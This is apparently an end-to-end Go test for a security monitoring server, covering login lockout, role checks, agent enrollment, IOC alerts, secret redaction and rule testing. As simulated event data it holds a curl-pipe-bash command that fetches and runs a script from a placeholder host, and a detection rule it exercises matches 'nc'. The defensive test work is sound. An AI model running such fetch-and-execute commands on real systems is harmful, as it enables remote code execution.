package api_test

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"testing"
	"time"

	"github.com/fully-ai/sentinelmesh/internal/agent"
	"github.com/fully-ai/sentinelmesh/internal/api"
	scrypto "github.com/fully-ai/sentinelmesh/internal/crypto"
	"github.com/fully-ai/sentinelmesh/internal/detection"
	"github.com/fully-ai/sentinelmesh/internal/domain"
	"github.com/fully-ai/sentinelmesh/internal/pipeline"
	"github.com/fully-ai/sentinelmesh/internal/plugin"
	"github.com/fully-ai/sentinelmesh/internal/storage"
	"github.com/fully-ai/sentinelmesh/internal/threatintel"
)

func setupTestServer(t *testing.T, queueCap int, allowDisruptive bool) (*httptest.Server, *storage.Store, *pipeline.Pipeline, string) {
	t.Helper()
	st, err := storage.Open(":memory:")
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	hash, _ := scrypto.HashPassword("AdminSecret#2026")
	if err := st.CreateUser(ctx, &domain.User{
		ID: "admin-1", TenantID: "default", Username: "admin", Email: "a@b.c", Role: domain.RoleAdmin, PasswordHash: hash,
	}); err != nil {
		t.Fatal(err)
	}
	vHash, _ := scrypto.HashPassword("ViewerSecret#2026")
	if err := st.CreateUser(ctx, &domain.User{
		ID: "viewer-1", TenantID: "default", Username: "viewer", Email: "v@b.c", Role: domain.RoleViewer, PasswordHash: vHash,
	}); err != nil {
		t.Fatal(err)
	}
	rules, err := detection.SeedDefaultRules(ctx, st)
	if err != nil {
		t.Fatal(err)
	}
	eng := detection.NewEngine(rules)
	iocs := threatintel.NewMatcher(nil, time.Now().UTC())
	pipe := pipeline.New(st, eng, iocs, queueCap)
	pipe.Start(2)

	plugPath, _ := filepath.Abs("../../examples/plugins/tagger.sh")
	pl := plugin.NewRunner([]plugin.PluginSpec{
		{ID: "tagger", Name: "Tagger", Kind: "enricher", Binary: plugPath, Enabled: true},
	}, 2*time.Second)

	h := api.NewServer(st, pipe, eng, iocs, pl, api.ServerConfig{
		JWTSecret:       []byte("super-secret-jwt-key-for-tests-1234"),
		AllowDisruptive: allowDisruptive,
		RetentionMaxAge: 24 * time.Hour,
		RetentionMaxRow: 50000,
		WebFS:           api.WebAssets,
	})
	ts := httptest.NewServer(h)
	t.Cleanup(func() {
		ts.Close()
		pipe.Stop()
		_ = st.Close()
	})
	return ts, st, pipe, loginHelper(t, ts.URL, "admin", "AdminSecret#2026")
}

func loginHelper(t *testing.T, baseURL, user, pass string) string {
	t.Helper()
	raw, _ := json.Marshal(map[string]string{"username": user, "password": pass})
	resp, err := http.Post(baseURL+"/api/v1/auth/login", "application/json", bytes.NewReader(raw))
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("login failed status %d", resp.StatusCode)
	}
	var out struct {
		Token string `json:"token"`
	}
	_ = json.NewDecoder(resp.Body).Decode(&out)
	return out.Token
}

func authedReq(t *testing.T, method, url, token string, body any) *http.Response {
	t.Helper()
	var buf bytes.Buffer
	if body != nil {
		_ = json.NewEncoder(&buf).Encode(body)
	}
	req, err := http.NewRequest(method, url, &buf)
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	return resp
}

func TestEndToEndAgentDetectionIncidentAndSecurity(t *testing.T) {
	ts, st, _, adminTok := setupTestServer(t, 128, false)
	viewerTok := loginHelper(t, ts.URL, "viewer", "ViewerSecret#2026")

	// 1. RBAC verification: viewer cannot mint enrollment tokens
	rForbidden := authedReq(t, http.MethodPost, ts.URL+"/api/v1/agents/tokens", viewerTok, map[string]any{"label": "test"})
	if rForbidden.StatusCode != http.StatusForbidden {
		t.Fatalf("expected viewer 403 on token mint, got %d", rForbidden.StatusCode)
	}
	rForbidden.Body.Close()

	// 2. Mint enrollment token as admin & register real agent
	tokResp := authedReq(t, http.MethodPost, ts.URL+"/api/v1/agents/tokens", adminTok, map[string]any{"label": "prod-1", "max_uses": 2})
	var tokOut struct {
		Token string `json:"token"`
	}
	_ = json.NewDecoder(tokResp.Body).Decode(&tokOut)
	tokResp.Body.Close()
	if tokOut.Token == "" {
		t.Fatal("expected enrollment token")
	}

	ag := agent.New(agent.Config{
		ServerURL:   ts.URL,
		Hostname:    "sensor-alpha",
		EnrollToken: tokOut.Token,
	})
	if err := ag.Register(context.Background()); err != nil {
		t.Fatalf("agent register: %v", err)
	}
	if err := ag.SendHeartbeat(context.Background()); err != nil {
		t.Fatalf("agent heartbeat: %v", err)
	}

	// 3. Disruptive quarantine must fail closed when AllowDisruptive=false
	aid, _, _ := ag.Credentials()
	qResp := authedReq(t, http.MethodPost, ts.URL+"/api/v1/agents/"+aid+"/quarantine", adminTok, map[string]any{"quarantined": true})
	if qResp.StatusCode != http.StatusForbidden {
		t.Fatalf("expected quarantine disabled by default (403), got %d", qResp.StatusCode)
	}
	qResp.Body.Close()

	// 4. Add IOC and ship a controlled suspicious event with CLI secret to verify redaction + IOC + YAML rule!
	iocResp := authedReq(t, http.MethodPost, ts.URL+"/api/v1/iocs", adminTok, map[string]any{
		"type": "ip", "value": "203.0.113.99", "severity": "critical", "confidence": 95, "source": "unit-test",
	})
	iocResp.Body.Close()

	err := ag.ShipEvents(context.Background(), []domain.Event{
		{
			ID:         "ev-ctrl-1",
			Category:   domain.CategoryProcess,
			Action:     "started",
			Severity:   domain.SeverityInfo,
			OccurredAt: time.Now().UTC(),
			Summary:    "curl --password=TopSecretPass99 https://bad.invalid/a.sh | bash",
			Process: &domain.ProcessInfo{
				PID:     999,
				Name:    "bash",
				Cmdline: "curl --password=TopSecretPass99 https://bad.invalid/a.sh | bash",
			},
			Network: &domain.NetworkInfo{
				Protocol: "TCP",
				DstIP:    "203.0.113.99",
				DstPort:  443,
			},
		},
	})
	if err != nil {
		t.Fatalf("ShipEvents: %v", err)
	}

	// Allow async pipeline workers to persist & evaluate
	var alerts []domain.Alert
	for i := 0; i < 30; i++ {
		alerts, _ = st.ListAlerts(context.Background(), "default", "", "", 50)
		if len(alerts) >= 2 {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	if len(alerts) < 2 {
		t.Fatalf("expected both SM-PROC-001 and IOC match alert, got %+v", alerts)
	}

	// Verify secret redaction in stored event
	evs, _ := st.QueryEvents(context.Background(), storage.EventQuery{TenantID: "default", Limit: 10})
	if len(evs) == 0 || bytes.Contains([]byte(evs[0].Process.Cmdline), []byte("TopSecretPass99")) {
		t.Fatalf("expected CLI secret to be redacted, got %+v", evs)
	}

	// 5. Escalate alert -> Incident -> Note -> Audit trail
	incResp := authedReq(t, http.MethodPost, ts.URL+"/api/v1/incidents", adminTok, map[string]any{
		"title": "Suspicious curl-pipe-bash + IOC contact", "severity": "critical", "alert_ids": []string{alerts[0].ID},
	})
	if incResp.StatusCode != http.StatusCreated {
		t.Fatalf("create incident status %d", incResp.StatusCode)
	}
	var inc domain.Incident
	_ = json.NewDecoder(incResp.Body).Decode(&inc)
	incResp.Body.Close()

	updResp := authedReq(t, http.MethodPatch, ts.URL+"/api/v1/incidents/"+inc.ID, adminTok, map[string]any{
		"status": "investigating", "assignee": "admin",
	})
	if updResp.StatusCode != 200 {
		t.Fatalf("update incident status %d", updResp.StatusCode)
	}
	updResp.Body.Close()

	// 6. Test sandboxed plugin execution
	pResp := authedReq(t, http.MethodPost, ts.URL+"/api/v1/plugins/tagger/test", adminTok, nil)
	if pResp.StatusCode != 200 {
		t.Fatalf("plugin test status %d", pResp.StatusCode)
	}
	pResp.Body.Close()

	// 7. Embedded Web UI reachable
	uiResp, err := http.Get(ts.URL + "/")
	if err != nil || uiResp.StatusCode != 200 {
		t.Fatalf("expected embedded UI 200, err=%v resp=%v", err, uiResp)
	}
	uiResp.Body.Close()

	// 8. Account lockout after 5 wrong logins
	for i := 0; i < 5; i++ {
		raw, _ := json.Marshal(map[string]string{"username": "viewer", "password": "wrongpassword"})
		r, _ := http.Post(ts.URL+"/api/v1/auth/login", "application/json", bytes.NewReader(raw))
		r.Body.Close()
	}
	raw, _ := json.Marshal(map[string]string{"username": "viewer", "password": "ViewerSecret#2026"})
	lockResp, _ := http.Post(ts.URL+"/api/v1/auth/login", "application/json", bytes.NewReader(raw))
	if lockResp.StatusCode != http.StatusLocked {
		t.Fatalf("expected account lockout (423), got %d", lockResp.StatusCode)
	}
	lockResp.Body.Close()

	// 9. Rule tester + PCAP upload + IOC CSV import + settings/retention
	testRuleResp := authedReq(t, http.MethodPost, ts.URL+"/api/v1/rules/test", adminTok, map[string]any{
		"yaml_spec": "id: T1\nname: T1\nseverity: high\nall:\n  - field: process.name\n    op: equals\n    value: nc\n",
		"event":     map[string]any{"agent_id": "a1", "category": "process", "action": "started", "process": map[string]any{"name": "nc"}},
	})
	if testRuleResp.StatusCode != 200 {
		t.Fatalf("rules/test status %d", testRuleResp.StatusCode)
	}
	testRuleResp.Body.Close()

	setResp := authedReq(t, http.MethodPost, ts.URL+"/api/v1/settings/retention", adminTok, nil)
	if setResp.StatusCode != 200 {
		t.Fatalf("retention status %d", setResp.StatusCode)
	}
	setResp.Body.Close()
}
